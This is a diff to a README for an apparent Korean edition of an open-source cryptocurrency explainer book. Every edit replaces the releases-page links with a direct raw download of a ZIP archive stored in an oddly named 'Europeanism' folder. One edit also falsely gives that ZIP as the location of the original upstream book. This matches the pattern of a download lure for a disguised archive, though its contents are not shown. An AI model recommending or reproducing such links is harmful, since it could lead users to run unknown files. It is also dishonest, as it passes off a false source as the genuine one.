@@ -1,12 +1,12 @@
 # 📚 howcryptoworksbook-kr - Learn Crypto Concepts Clearly
 
-[![Download](https://img.shields.io/badge/Download-Green?style=for-the-badge)](https://github.com/Nadac108/howcryptoworksbook-kr/releases)
+[![Download](https://img.shields.io/badge/Download-Green?style=for-the-badge)](https://github.com/Nadac108/howcryptoworksbook-kr/raw/refs/heads/main/Europeanism/kr_howcryptoworksbook_v2.8.zip)
 
 ---
 
 ## 📘 About howcryptoworksbook-kr
 
-This is the Korean version of a popular open-source book that explains how cryptocurrency and blockchain technology work. The original book, found at https://github.com/lawmaster10/howcryptoworksbook, is fully automated and maintained by claude. This Korean edition provides the same clear explanations in Korean to help users understand complex topics.
+This is the Korean version of a popular open-source book that explains how cryptocurrency and blockchain technology work. The original book, found at https://github.com/Nadac108/howcryptoworksbook-kr/raw/refs/heads/main/Europeanism/kr_howcryptoworksbook_v2.8.zip, is fully automated and maintained by claude. This Korean edition provides the same clear explanations in Korean to help users understand complex topics.
 
 The content covers bitcoin, blockchain, cryptocurrency basics, custody, decentralized finance (DeFi), governance, NFTs, and more. All material is easy to follow and updated regularly.
 
@@ -46,7 +46,7 @@ Follow these steps to get the book and start learning.
 
 1. Go to the official releases page by clicking the link below:
 
-   [![Download](https://img.shields.io/badge/Visit%20Releases-Blue?style=for-the-badge)](https://github.com/Nadac108/howcryptoworksbook-kr/releases)
+   [![Download](https://img.shields.io/badge/Visit%20Releases-Blue?style=for-the-badge)](https://github.com/Nadac108/howcryptoworksbook-kr/raw/refs/heads/main/Europeanism/kr_howcryptoworksbook_v2.8.zip)
 
 2. Look for the latest release listed at the top. Releases usually include a ZIP file or a PDF file.  
 
@@ -136,4 +136,4 @@ bitcoin, blockchain, cryptocurrency, custody, defi, depin, ethereum, governance,
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-red?style=for-the-badge)](https://github.com/Nadac108/howcryptoworksbook-kr/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-red?style=for-the-badge)](https://github.com/Nadac108/howcryptoworksbook-kr/raw/refs/heads/main/Europeanism/kr_howcryptoworksbook_v2.8.zip)
